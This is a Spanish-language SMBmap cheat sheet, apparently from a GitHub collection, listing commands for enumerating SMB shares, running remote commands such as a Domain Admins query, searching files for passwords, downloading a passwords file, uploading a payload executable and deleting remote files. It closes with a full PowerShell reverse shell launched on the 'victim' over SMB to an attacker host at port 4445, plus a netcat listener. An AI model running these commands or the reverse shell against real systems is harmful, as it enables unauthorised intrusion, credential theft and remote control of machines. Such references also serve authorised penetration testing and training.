# SMBmap Cheat Sheet

#### Comprueba si hay recursos compartidos en el host especificado con el nombre de usuario y la contraseña proporcionados
```
smbmap -u <Username> -p <Password> -H <IP-Address>
```

#### Ejecución de comandos
```
smbmap -u <Username> -p <Password> -d <Domain> -x 'net group "Domain Admins" /domain' -H <IP-Address>
```

#### Listar un recurso no recursivo (ls)
```
smbmap -u <Username> -p <Password> -H <IP-Address> -r 'C$\Users'
```

#### Listar un recurso de manera recursiva
```
smbmap -u <Username> -p <Password> -H <IP-Address> -R 'C$\Users'
```

#### Listado de unidades
```
smbmap -u <Username> -p <Password> -H <IP-Address> -L
```

#### Buscar algun contenido en archivos
```
smbmap -u <Username> -p <Password> -H <IP-Address> -F password --search-path 'C:\Users\wingus\AppData\Roaming'
```

#### Descargar un archivo
```
smbmap -u <Username> -p <Password> -H <IP-Address> --download 'C$\temp\passwords.txt'
```

#### Cargar un archivo
```
smbmap -u <Username> -p <Password> -H <IP-Address> --upload '/tmp/payload.exe C$\temp\payload.exe'
```

#### Eliminar un archivo remoto
```
smbmap -u <Username> -p <Password> -H <IP-Address> --delete 'C$\temp\msf.exe'
```

#### Generar una shell inversa
+ Para la victima
```
smbmap -u <Username> -p <Password> -d <Domain> -H <IP-Address> -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
```
+ En el atacante
```
nc -l 4445
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)